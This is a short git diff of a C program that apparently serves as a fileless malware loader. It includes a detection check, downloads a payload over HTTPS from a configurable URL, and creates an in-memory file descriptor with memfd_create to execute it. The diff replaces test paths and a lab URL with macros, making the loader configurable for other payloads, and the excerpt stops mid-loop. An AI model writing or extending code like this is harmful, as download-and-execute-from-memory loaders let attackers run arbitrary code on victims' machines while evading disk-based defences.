@@ -4,7 +4,8 @@
 #include <sys/mman.h>
 #include "detect.h"
 #include "helpers.h"
-#include "getHTTPS.h"
+#include "networking.h"
+#include "preferences.h"
 
 #define PAYLOAD_FILE "../test_files/test_ELF" // payload file to open, delete on final version
 
@@ -15,9 +16,9 @@ int main(int argc, char **argv){
     int payloadFD; // in memory file descriptor
     int writeReturnSize;
     int d; //to hold the return value of detect()
-    char * payload_argv[] = {"../test_files/test_ELF", "testing", NULL}; // argv for payload
-    char * payload_envp[] = {NULL}; // envp for payload
-    char *pathToWrite = "../test_files/test_static_copy.pdf";
+    char * payload_argv[] = PAYLOAD_ARGV; // argv for payload
+    char * payload_envp[] = PAYLOAD_ENVP; // envp for payload
+    char *pathToWrite = PATH_TO_WRITE;
     
     
     // payloadFile = fopen(PAYLOAD_FILE, "r"); // open payload binary
@@ -27,7 +28,7 @@ int main(int argc, char **argv){
     // fclose(payloadFile); //close file
 
 
-    payload = getHTTPS("https://seedsecuritylabs.org/Labs_20.04/Files/Shellcode/Shellcode.pdf");
+    payload = getHTTPS(PAYLOAD_URL);
 
 
     while ((payloadFD = memfd_create("payload", 0)) <= 2){ // create memory file descriptor for execution
